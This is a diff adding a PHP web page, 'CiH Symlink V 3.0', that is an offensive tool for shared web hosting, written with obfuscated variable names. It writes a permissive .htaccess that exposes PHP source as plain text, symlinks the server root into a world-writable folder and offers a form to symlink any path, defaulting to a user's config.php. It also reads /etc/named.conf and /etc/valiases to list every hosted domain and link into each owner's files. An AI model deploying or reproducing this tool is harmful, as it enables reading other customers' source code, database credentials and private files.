@@ -1,0 +1,35 @@
+<html>
+
+<head>
+  <title>CiH Symlink</title>
+</head>
+
+<body bgcolor="#C0C0C0">
+<p align="center"><b><i><u><font size="5">CiH Symlink V 3.0</font></u></i></b>
+
+
+<?php
+
+@set_time_limit(0);
+@mkdir('cihsym',0777);
+$IIIIIIIIIIl1  = "Options all \n DirectoryIndex cih.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+$IIIIIIIIII1I =@fopen ('cihsym/.htaccess','w');
+fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
+echo '  <br /><br /> <form method="post"> File Path:<br /> <input type="text" name="file" value="/home/user/public_html/config.php" size="60"/> <br>Symlink Name<br> <input type="text" name="symfile" value="cih.html" size="60"/><br /><br /> <input type="submit" value="symlink" name="symlink" /> <br /><br /> </form> ';
+$IIIIIIII1lIl = $_POST['file'];
+$symfile = $_POST['symfile'];
+$symlink = $_POST['symlink']; if ($symlink) { @symlink("$IIIIIIII1lIl","cihsym/$symfile");
+echo '<br /><a target="_blank" href="cihsym/'.$symfile.'" >Go To ['.$symfile.']</a>'; }
+@symlink('/','cihsym/root');
+$IIIIIIIIIllI = @file('/etc/named.conf');
+if(!$IIIIIIIIIllI) { die (" can't read /etc/named.conf"); } else {
+echo "<div class='tmp'><table  width='40%'><td>Domains</td><td>Users & symlink</td>";
+foreach($IIIIIIIIIllI as $IIIIIIIIIll1){ if(eregi('zone',$IIIIIIIIIll1)){ preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11); flush(); if(strlen(trim($IIIIIIIIIl11[1][0])) >2){ $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0])); $IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
+@symlink('/','cihsym/root'); $IIIIIIII1I1l = $IIIIIIIIIl11[1][0]; echo " <tr> <td> <div class='dom'><a target='_blank' href=http://www.".$IIIIIIIIIl11[1][0]."/>".$IIIIIIII1I1l." </a> </div> </td> <td> <a href='cihsym/root/home/".$IIIIIIIII1I1['name']."/public_html' target='_blank'>".$IIIIIIIII1I1['name']."</a>  </td> </tr></div> ";
+flush(); } } } }
+
+?>
+
+</body>
+
+</html>
